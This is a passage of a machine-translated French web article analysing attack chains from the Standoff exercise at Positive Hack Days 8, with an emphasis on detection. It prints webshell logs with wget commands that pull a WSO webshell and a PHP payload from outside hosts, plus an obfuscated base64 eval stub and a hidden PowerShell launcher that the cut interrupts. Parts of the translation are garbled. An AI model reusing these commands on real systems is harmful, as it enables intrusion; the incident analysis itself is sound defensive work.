<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🖖🏽 📲 🦄 Confrontation à Positive Hack Days 8: analyse des chaînes d'attaque 🦗 ⬛️ 👼🏾</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Ainsi, la prochaine «confrontation» s'est terminée lors du Positive Hack Days 8. Cette fois, plus d'une centaine de personnes ont participé au combat:...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Confrontation à Positive Hack Days 8: analyse des chaînes d'attaque</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/pt/blog/418335/"> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><img src="https://habrastorage.org/webt/lv/ma/od/lvmaodafe3q0xv0wflk--q_xae4.png"></a> <br><br>  Ainsi, la prochaine «confrontation» s'est terminée lors du Positive Hack Days 8. Cette fois, plus d'une centaine de personnes ont participé au combat: 12 équipes d'attaquants, 8 équipes de défenseurs et toute une ville qu'ils ont dû attaquer et défendre. <a name="habracut"></a><br><br>  Cette fois, The Standoff a été suivi non seulement par des équipes d'attaquants et de défenseurs, les trois produits de notre société ont regardé tout ce qui s'est passé sur le réseau de jeux: <br><br><ul><li>  <b><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">MaxPatrol SIEM</a></b> - système SIEM. </li><li>  <b><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">PT Network Attack Discovery</a></b> est une solution de sécurité réseau pour analyser le trafic réseau, identifier et enquêter sur les incidents. </li><li>  <b><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">PT MultiScanner</a></b> est un système à plusieurs niveaux pour détecter et bloquer le contenu malveillant. </li></ul><br>  Les trois produits ont été surveillés par l'équipe du centre expert en sécurité Positive Technologies (PT ESC), qui surveille les tendances et les événements du jeu pour en informer les visiteurs du centre expert. <br><br>  C'était la première participation d'une telle équipe d'experts et de produits et ils ont montré leur meilleur côté: il y avait tellement de données qui seraient suffisantes pour un énorme rapport.  Les réseaux du bureau n ° 2 de la société intégratrice SPUTNIK et du bureau n ° 1 de la compagnie d'assurance BeHealthy se sont avérés les plus intéressants et les plus complets par description.  Le bureau n ° 2 était intéressant en ce qu'il était sous la supervision du SOC RTK, mais n'était pas pris en charge par une équipe de défenseurs et il était complètement piraté par les équipes attaquantes. <br><br>  Permettez-moi de vous rappeler qu'en plus de deux bureaux, la ville disposait d'une centrale et d'une sous-station de chauffage et d'électricité, de chemins de fer, de maisons intelligentes avec récupération d'énergie et de banques avec des distributeurs automatiques de billets. <br><br><img src="https://habrastorage.org/webt/ki/99/iq/ki99iqb0x5sdfk5d_am3faotusu.png"><br><br>  <i>Infrastructure de jeu</i> <br><br>  La façon dont les événements dans les bureaux # 1 et # 2 ont regardé à travers le prisme de MaxPatrol SIEM, PT NAD et PT MultiScanner en mettant l'accent sur les détails techniques du piratage sera discutée plus loin. <br><br>  Diagramme logique d'un bureau de réseau de jeux n ° 2: <br><br><img src="https://habrastorage.org/webt/m4/fw/um/m4fwumpq3cljrqs-6r1qjh5kp5q.png"><br><br>  L'adresse des équipes attaquantes est 172.31.x.0 / 24, où x est le numéro de commande de 1 à 8. En fait, il y avait 12 équipes au total, mais en raison de l'architecture de l'infrastructure réseau du réseau (le cœur du réseau a été émulé dans Cisco CSR1000v) et du physique équipements, il a été possible d'organiser seulement 8 interfaces réseau physiques qui ont été commutées pour les équipes dans toute la zone de jeu.  Par conséquent, dans quatre réseaux, deux équipes étaient localisées. <br><br>  Dans l'infrastructure d'Office # 2, quatre segments de réseau ont été alloués: <br><br><ul><li>  DMZ (100,64,154,0/25); </li><li>  serveurs (10.106.60.0/24); </li><li>  Employés de l'entreprise (10.106.50.0/24); </li><li>  équipe de défenseurs (10.106.82.0/24). </li></ul><br>  Les nœuds situés dans la zone démilitarisée étaient accessibles sur le réseau pour tous les attaquants.  Lors de l'accès à ces nœuds, les adresses réseau réelles des commandes NAT provenaient du pool 100.110.255.0/24, donc pour les défenseurs, il n'était pas facile de déterminer à qui appartient tel ou tel trafic réseau - cela pourrait être l'une des 12 équipes attaquantes ou un vérificateur de script légitime, vérifier la facilité de service des services à partir du même pool d'adresses que les attaquants. <br><br>  Pour remplir nos produits d'événements sur ce qui se passe dans l'infrastructure de jeu, nous avons organisé la suppression et la redirection d'une copie de tout le trafic réseau dans PT NAD, ainsi que mis en place un audit approfondi des événements des systèmes cibles et organisé leur livraison à MaxPatrol SIEM. <br><br>  L'analyse des attaques mettant l'accent sur les équipes se trouve dans notre autre <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">rapport sur Habr</a> . <br><br><h2>  Joomla (100.64.154.147) </h2><br>  L'un des serveurs du bureau DMZ # 2 était un serveur avec Joomla CMS.  Quelques heures après le début du jeu, les premiers signes de compromis de ce serveur sont apparus dans PT NAD - remplissage webshell à partir du pool d'adresses IP «grises»: <br><br><img src="https://habrastorage.org/webt/pj/jq/fr/pjjqfrt_2jdv_fwplypyzlmhwcg.png"><br><br>  Comme mentionné, tous les sous-réseaux des équipes attaquantes ont été arrêtés sur le même ME (Attacker-FW) et lors de la création d'une connexion aux objets attaqués, les adresses IP des attaquants ont été traduites en adresses IP grises à partir d'un seul pool (100.110.255.0/24).  Par conséquent, pour la personnification des attaques par commandes, un schéma a été implémenté avec l'enrichissement des passerelles selon le tableau NAT de ce ME.  Dans le cadre de MP SIEM, l'enrichissement a été le suivant: <br><br><img src="https://habrastorage.org/webt/bk/4d/7s/bk4d7szltcyuzoywpodadcszg3c.png"><br><br>  Cette approche nous a permis de déterminer que cette attaque avait été initiée par l'équipe n ° 1.  Cependant, en raison de l'utilisation du même pool d'adresses par différentes équipes, nous ne pouvons pas déterminer de manière fiable le nom de l'équipe à la demande d'un réseau particulier, et à des fins de narration, nous nommerons les équipes par leur numéro de réseau. <br><br>  Une heure après avoir essayé la commande n ° 1, PT NAD a remarqué que la commande n ° 8 se chargeait sur un autre shell web avec le nom parlant SHE __. La commande définit une session ssh à partir d'un utilisateur utilisateur non privilégié. <br><br><img src="https://habrastorage.org/webt/xp/zp/6h/xpzp6hvlbykhamirlmbhoxm2lm0.png"><br><br><img src="https://habrastorage.org/webt/bd/cc/mx/bdccmxlsasdvx5avlabnoxqgm44.png"><br><br>  Le mot de passe de ce compte était en haut du dictionnaire rockyou et était assorti.  L'accès au compte root pour la 8e équipe n'est apparu qu'à environ 16 h 00 en raison de l'appartenance de l'utilisateur au groupe avec le droit d'exécuter des commandes sans mot de passe à partir de la racine.  Nous pouvons en être convaincus dans les journaux MP SIEM, qui nous parlent de la première connexion en tant qu'utilisateur utilisateur, puis de l'escalade de privilèges avec la commande sudo. <br><br><img src="https://habrastorage.org/webt/s4/jz/2m/s4jz2m3zuf1mirhsdhjrdfu9ug8.png"><br><img src="https://habrastorage.org/webt/nl/wq/la/nlwqlabrbzuu3vnjrtzbuo0qaro.png"><br><br>  La durée du journal peut varier de 3 heures en raison de la configuration du serveur de jeu. <br><br>  Au soir du premier jour de l'affrontement, la sixième équipe a pris possession de Joomla.  NAD a découvert l'exploitation d'une vulnérabilité, ou plutôt d'une <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">fonctionnalité</a> par laquelle l'équipe a téléchargé le shell Web WSO largement connu et a commencé à interagir avec. <br><br><img src="https://habrastorage.org/webt/ts/il/um/tsilumlbi-mfrbehbf8vo1dcjfo.png"><br><br><pre><code class="hljs powershell"><span class="hljs-number"><span class="hljs-number">100.110</span></span>.<span class="hljs-number"><span class="hljs-number">255.160</span></span> - - [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">39</span></span>:<span class="hljs-number"><span class="hljs-number">31</span></span> -<span class="hljs-number"><span class="hljs-number">0700</span></span>] GET /templates/beez3/index.php HTTP <span class="hljs-number"><span class="hljs-number">100.110</span></span>.<span class="hljs-number"><span class="hljs-number">255.160</span></span> - - [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">39</span></span>:<span class="hljs-number"><span class="hljs-number">35</span></span> -<span class="hljs-number"><span class="hljs-number">0700</span></span>] POST /templates/beez3/index.php HTTP <span class="hljs-number"><span class="hljs-number">100.110</span></span>.<span class="hljs-number"><span class="hljs-number">255.160</span></span> - - [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">39</span></span>:<span class="hljs-number"><span class="hljs-number">35</span></span> -<span class="hljs-number"><span class="hljs-number">0700</span></span>] GET /templates/beez3/index.php HTTP <span class="hljs-number"><span class="hljs-number">100.110</span></span>.<span class="hljs-number"><span class="hljs-number">255.220</span></span> - - [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">39</span></span>:<span class="hljs-number"><span class="hljs-number">56</span></span> -<span class="hljs-number"><span class="hljs-number">0700</span></span>] POST /templates/beez3/index.php HTTP … <span class="hljs-number"><span class="hljs-number">100.110</span></span>.<span class="hljs-number"><span class="hljs-number">255.32</span></span> - - [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">44</span></span>:<span class="hljs-number"><span class="hljs-number">39</span></span> -<span class="hljs-number"><span class="hljs-number">0700</span></span>] POST /templates/beez3/index.php HTTP <span class="hljs-number"><span class="hljs-number">100.110</span></span>.<span class="hljs-number"><span class="hljs-number">255.118</span></span> - - [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">44</span></span>:<span class="hljs-number"><span class="hljs-number">43</span></span> -<span class="hljs-number"><span class="hljs-number">0700</span></span>] POST /templates/beez3/index.php HTTP <span class="hljs-number"><span class="hljs-number">100.110</span></span>.<span class="hljs-number"><span class="hljs-number">255.145</span></span> - - [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">44</span></span>:<span class="hljs-number"><span class="hljs-number">49</span></span> -<span class="hljs-number"><span class="hljs-number">0700</span></span>] GET /templates/beez3/index.php HTTP</code> </pre> <br>  Il est à noter que le script utilisé par les commandes pour remplir les shells, <br>  nécessite un compte administrateur, dont le mot de passe a été sélectionné à l'aide d'une autre <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">vulnérabilité</a> CVE-2017-14596 dans le mécanisme d'authentification dans Joomla via LDAP: en modifiant la demande d'authentification LDAP, les attaquants récupèrent rapidement l'identifiant et le mot de passe du compte administrateur. <br><br>  Et après une demi-heure, ils ont pris le contrôle de l'ensemble du système. <br><br><img src="https://habrastorage.org/webt/0f/mb/kh/0fmbkhezemjgbqpk33mmdrypg70.png"><br><br>  Les équipes attaquantes ont utilisé la machine capturée pour de nouvelles reconnaissances dans le réseau du deuxième bureau SPUTNIK avec les utilitaires nmap et hping3.  On peut se faire une idée de leurs actions à partir des données MP SIEM: <br><br><img src="https://habrastorage.org/webt/tb/o2/lz/tbo2lzwokr5rloy_7ykz8klyywg.png"><br><img src="https://habrastorage.org/webt/vn/nr/o4/vnnro4qzj6jwsw8snzzpmfpu8gy.png"><br><br>  Exemple de réseau DMZ Intelligence Office 2 (100.64.154.0/24) et du réseau de l'équipe de défense (10.106.82.0/24): <br><br><img src="https://habrastorage.org/webt/ne/bu/dr/nebudriyumef2zbdsigm2ncyqqm.png"><br><img src="https://habrastorage.org/webt/tv/6u/ay/tv6uaynn7krj_ls6snexal-nu3g.png"><br><br>  À 21h17, nous avons constaté que le client OpenVPN était installé et lancé sur le serveur Joomla.  La connexion a été établie avec le serveur 195.16.61.229, situé à Moscou.  Un peu plus tard, nous avons découvert que ces actions étaient effectuées par des membres de l'équipe # 6 et ainsi l'équipe a réussi à attirer des ressources informatiques et humaines supplémentaires situées sur un site distant. <br><br>  Toutes les interactions avec le site distant ont été réalisées à l'intérieur du tunnel protégé, il est donc impossible d'établir la nature de cette interaction et le degré de son influence sur le jeu.  Nous ne pouvons que tirer des conclusions indirectes, basées sur le nombre de sessions VPN et la quantité de données transférées. <br><br><img src="https://habrastorage.org/webt/iw/ce/c4/iwcec4-s1rj715wnjapvtqgivza.png"><br><br>  Mais le plus intéressant est que l'équipe n'a pas nettoyé les traces - après le jeu, nous avons trouvé sur le serveur ovpn une configuration contenant la racine et les certificats personnels, la clé privée et les données personnelles du propriétaire de la clé.  Si vous utilisez un moteur de recherche, il n'est pas du tout difficile de déterminer la véritable identité du propriétaire sous le pseudo phonexicum.  La carte complète avec toutes les connexions VPN pendant le jeu peut être consultée à la fin de l'article. <br><br>  D'autres événements intéressants ont commencé à se développer après minuit (+3 heures pour les journaux). <br>  La commande Shell /id.php # 4 trouve la commande # 1: <br><br><pre> <code class="hljs powershell">[<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">21</span></span>:<span class="hljs-number"><span class="hljs-number">58</span></span>:<span class="hljs-number"><span class="hljs-number">22</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] <span class="hljs-string"><span class="hljs-string">"GET /id.php HTTP/1.1 [15/May/2018:21:58:24 +0000] "</span></span>GET /id.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">21</span></span>:<span class="hljs-number"><span class="hljs-number">58</span></span>:<span class="hljs-number"><span class="hljs-number">34</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] <span class="hljs-string"><span class="hljs-string">"GET /id.php?c=ls HTTP/1.1 [15/May/2018:21:58:38 +0000] "</span></span>GET /id.php?cmd=ls HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">21</span></span>:<span class="hljs-number"><span class="hljs-number">59</span></span>:<span class="hljs-number"><span class="hljs-number">53</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] <span class="hljs-string"><span class="hljs-string">"GET /id.php?cmd=id HTTP/1.1 [15/May/2018:21:59:56 +0000] "</span></span>GET /id.php?cmd=ls+<span class="hljs-literal"><span class="hljs-literal">-la</span></span> HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span></code> </pre> <br><img src="https://habrastorage.org/webt/bb/1j/z7/bb1jz7fidnpbep9o-lxcqmdwoou.png"><br><img src="https://habrastorage.org/webt/4u/or/jj/4uorjjrsmjk1kzlautfduvh8gtq.png"><br><br>  Et se renforce immédiatement dans le système, préservant le shell Web WSO sous le nom 123.php <br><br><pre> <code class="hljs powershell">[<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">22</span></span>:<span class="hljs-number"><span class="hljs-number">00</span></span>:<span class="hljs-number"><span class="hljs-number">05</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] <span class="hljs-string"><span class="hljs-string">"GET /id.php?cmd=wget HTTP/1.1 [15/May/2018:22:00:10 +0000] "</span></span>GET /id.php?cmd=wget <span class="hljs-literal"><span class="hljs-literal">-h</span></span> HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">22</span></span>:<span class="hljs-number"><span class="hljs-number">00</span></span>:<span class="hljs-number"><span class="hljs-number">53</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] <span class="hljs-string"><span class="hljs-string">"GET /id.php?cmd=cat index.php HTTP/1.1 [15/May/2018:22:01:04 +0000] "</span></span>GET /id.php?cmd=wget http://txt.<span class="hljs-number"><span class="hljs-number">731</span></span>my.com/wso.txt <span class="hljs-literal"><span class="hljs-literal">-o</span></span> <span class="hljs-number"><span class="hljs-number">123</span></span>.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span></code> </pre> <br><img src="https://habrastorage.org/webt/uu/yf/sb/uuyfsboyntyyavtzwwh4diilju8.png"><br><img src="https://habrastorage.org/webt/1i/rb/7f/1irb7fdixxk8cdoblvtn7hkldlm.png"><br><br>  La première équipe a hébergé jusqu'à ce que l'équipe # 4 le découvre quelques heures plus tard et, après une courte discussion, renomme le shell id.php en 021371b392f0b42398630fd668adff5d.php <br><br><pre> <code class="hljs powershell">[<span class="hljs-number"><span class="hljs-number">16</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">00</span></span>:<span class="hljs-number"><span class="hljs-number">06</span></span>:<span class="hljs-number"><span class="hljs-number">13</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] <span class="hljs-string"><span class="hljs-string">"GET /id.php?cmd=id HTTP/1.1 [16/May/2018:00:06:26 +0000] "</span></span>GET /id.php?cmd=ls HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> [<span class="hljs-number"><span class="hljs-number">16</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">00</span></span>:<span class="hljs-number"><span class="hljs-number">07</span></span>:<span class="hljs-number"><span class="hljs-number">16</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] <span class="hljs-string"><span class="hljs-string">"GET /id.php?cmd=mv id.php 021371b392f0b42398630fd668adff5d.php HTTP/1.1</span></span></code> </pre><br>  Par la suite, 021371b392f0b42398630fd668adff5d.php a été remplacé par kekekeke.php et kekpek.php <br><br><pre> <code class="hljs powershell">[<span class="hljs-number"><span class="hljs-number">16</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">00</span></span>:<span class="hljs-number"><span class="hljs-number">41</span></span>:<span class="hljs-number"><span class="hljs-number">23</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] GET /<span class="hljs-number"><span class="hljs-number">021371</span></span>b392f0b42398630fd668adff5d.php?cmd=echo <span class="hljs-string"><span class="hljs-string">"&lt;?phpeval(base64_decode(ailYmWoCX2oBXg8FSJdSxwQkAgAd3UiJ5moQWmoxWA8FWWoyWA8FSJZqK1gPBVBWX2oJWJm2EEiJ1k0xyWoiQVqyBw8FSJZIl18PBf.chr(47).m));?&gt;"</span></span> &gt; kekekeke.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> [<span class="hljs-number"><span class="hljs-number">16</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">06</span></span>:<span class="hljs-number"><span class="hljs-number">20</span></span>:<span class="hljs-number"><span class="hljs-number">52</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] GET /<span class="hljs-number"><span class="hljs-number">021371</span></span>b392f0b42398630fd668adff5d.php?cmd=wget%<span class="hljs-number"><span class="hljs-number">20193.124</span></span>.<span class="hljs-number"><span class="hljs-number">190.162</span></span>/kek.php <span class="hljs-literal"><span class="hljs-literal">-O</span></span> kekpek.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span></code> (base64_decode (ailYmWoCX2oBXg8FSJdSxwQkAgAd3UiJ5moQWmoxWA8FWWoyWA8FSJZqK1gPBVBWX2oJWJm2EEiJ1k0xyWoiQVqyBw8FSJZIl18PBf.chr ( <code class="hljs powershell">[<span class="hljs-number"><span class="hljs-number">16</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">00</span></span>:<span class="hljs-number"><span class="hljs-number">41</span></span>:<span class="hljs-number"><span class="hljs-number">23</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] GET /<span class="hljs-number"><span class="hljs-number">021371</span></span>b392f0b42398630fd668adff5d.php?cmd=echo <span class="hljs-string"><span class="hljs-string">"&lt;?phpeval(base64_decode(ailYmWoCX2oBXg8FSJdSxwQkAgAd3UiJ5moQWmoxWA8FWWoyWA8FSJZqK1gPBVBWX2oJWJm2EEiJ1k0xyWoiQVqyBw8FSJZIl18PBf.chr(47).m));?&gt;"</span></span> &gt; kekekeke.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> [<span class="hljs-number"><span class="hljs-number">16</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">06</span></span>:<span class="hljs-number"><span class="hljs-number">20</span></span>:<span class="hljs-number"><span class="hljs-number">52</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] GET /<span class="hljs-number"><span class="hljs-number">021371</span></span>b392f0b42398630fd668adff5d.php?cmd=wget%<span class="hljs-number"><span class="hljs-number">20193.124</span></span>.<span class="hljs-number"><span class="hljs-number">190.162</span></span>/kek.php <span class="hljs-literal"><span class="hljs-literal">-O</span></span> kekpek.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span></code> &gt; Kekekeke.php HTTP <code class="hljs powershell">[<span class="hljs-number"><span class="hljs-number">16</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">00</span></span>:<span class="hljs-number"><span class="hljs-number">41</span></span>:<span class="hljs-number"><span class="hljs-number">23</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] GET /<span class="hljs-number"><span class="hljs-number">021371</span></span>b392f0b42398630fd668adff5d.php?cmd=echo <span class="hljs-string"><span class="hljs-string">"&lt;?phpeval(base64_decode(ailYmWoCX2oBXg8FSJdSxwQkAgAd3UiJ5moQWmoxWA8FWWoyWA8FSJZqK1gPBVBWX2oJWJm2EEiJ1k0xyWoiQVqyBw8FSJZIl18PBf.chr(47).m));?&gt;"</span></span> &gt; kekekeke.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> [<span class="hljs-number"><span class="hljs-number">16</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">06</span></span>:<span class="hljs-number"><span class="hljs-number">20</span></span>:<span class="hljs-number"><span class="hljs-number">52</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] GET /<span class="hljs-number"><span class="hljs-number">021371</span></span>b392f0b42398630fd668adff5d.php?cmd=wget%<span class="hljs-number"><span class="hljs-number">20193.124</span></span>.<span class="hljs-number"><span class="hljs-number">190.162</span></span>/kek.php <span class="hljs-literal"><span class="hljs-literal">-O</span></span> kekpek.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span></code> </pre> <br><img src="https://habrastorage.org/webt/rx/ei/zf/rxeizfxenzfe2cxwf1xuuc8bwzk.png"><br><br>  Les événements suivants dans l'infrastructure de domaine du bureau # 2 SPUTNIK sont étroitement liés à ce qui se passe sur Jumla. <br><br><h2>  SPUTNIK (10.106.60.0/24) </h2><br>  Après que Joomla a été percé, l'attaquant a eu accès aux segments internes de l'infrastructure SPUTNIK (Office # 2).  Sans réfléchir à deux fois, l'exploit MS17-010 vole vers le contrôleur de domaine WIN2008R2-DC.domain2.phd (10.106.60.10). <br><br><img src="https://habrastorage.org/webt/ok/iw/xo/okiwxohg5xsajx_kpbq3muhbwss.png"><br><br>  Il est plus pratique d'observer la chronologie d'autres événements par les déclencheurs de MP SIEM: <br><br><img src="https://habrastorage.org/webt/pe/b3/dc/peb3dct4qumtok5vppa_awaxxgg.png"><br><img src="https://habrastorage.org/webt/ad/vn/ul/advnuld4auuorgtjbnxb3h3itxy.png"><br><br>  La première étape de l'attaquant a été de créer un utilisateur avec le nom "nom d'utilisateur" et le mot de passe "1qazzaq!"  et l'ajouter au groupe d'administrateurs locaux (écran n ° 2).  L'exploitation réussie des exploits de MS17-010 donne accès avec les privilèges NT-Authority \ System et dans les journaux Windows, cet accès est affiché sous la forme win2008r2-dc $. <br><br><img src="https://habrastorage.org/webt/xb/p7/hv/xbp7hvoec-1pl8spi8mso-hj-qo.png"><br><img src="https://habrastorage.org/webt/eg/kw/zp/egkwzpqyruruxatatp4ikdlqkyy.png"><br><img src="https://habrastorage.org/webt/mu/ei/c9/mueic9dlqmeodoln-b88gzhoywq.png"><br><br>  Au nom du nouvel utilisateur, crée quelques services qui exécutent un certain script PowerShell: <br><br><pre> <code class="hljs powershell">%COMSPEC% /b /c start /b /min powershell.exe <span class="hljs-literal"><span class="hljs-literal">-nop</span></span> <span class="hljs-literal"><span class="hljs-literal">-w</span></span> <span class="hljs-keyword"><span class="hljs-keyword">hidden</span></span> <span class="hljs-literal"><span class="hljs-literal">-noni</span></span> <span class="hljs-literal"><span class="hljs-literal">-c</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>([<span class="hljs-built_in"><span class="hljs-built_in">Int</span></span><span class="hljs-type"><span class="hljs-type">Ptr</span></span>]::Size <span class="hljs-operator"><span class="hljs-operator">-eq</span></span> <span class="hljs-number"><span class="hljs-number">4</span></span>){<span class="hljs-variable"><span class="hljs-variable">$b</span></span>=<span class="hljs-variable"><span class="hljs-variable">$env:windir</span></span>+<span class="hljs-string"><span class="hljs-string">'\sysnative\WindowsPowerShell\v1.0\powershell.exe'</span></span>}<span class="hljs-keyword"><span class="hljs-keyword">else</span></span>{<span class="hljs-variable"><span class="hljs-variable">$b</span></span>=<span class="hljs-string"><span class="hljs-string">'powershell.exe'</span></span>};<span class="hljs-variable"><span class="hljs-variable">$s</span></span>=<span class="hljs-built_in"><span class="hljs-built_in">New-Object</span></span> System.Diagnostics.ProcessStartInfo;<span class="hljs-variable"><span class="hljs-variable">$s</span></span>.FileName=<span class="hljs-variable"><span class="hljs-variable">$b</span></span>;<span class="hljs-variable"><span 